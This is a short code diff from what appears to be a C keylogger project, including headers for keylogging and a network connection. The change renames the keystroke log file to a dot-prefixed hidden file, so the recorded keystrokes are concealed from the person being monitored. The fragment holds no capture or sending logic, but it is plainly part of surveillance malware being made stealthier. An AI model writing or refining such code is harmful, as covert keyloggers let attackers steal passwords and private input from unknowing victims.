@@ -1,7 +1,7 @@
 #include "keylogger.h"
 #include "connection.h"
 
-const char *keylogger_log_file_Location = "keylogger.txt";
+const char *keylogger_log_file_Location = ".keylogger.txt";
 FILE *keylogger_log = NULL; 
 
 void * start_keylogger_log(){
